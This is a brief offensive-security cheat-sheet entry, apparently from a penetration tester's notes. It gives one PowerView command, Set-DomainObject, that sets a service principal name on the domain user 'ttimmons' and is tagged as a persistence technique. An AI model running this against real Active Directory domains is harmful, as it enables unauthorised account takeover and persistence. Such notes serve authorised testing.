# Set SPN Example

OS: Windows
Description: Set SPN
Security Domains: Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21)

```jsx
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```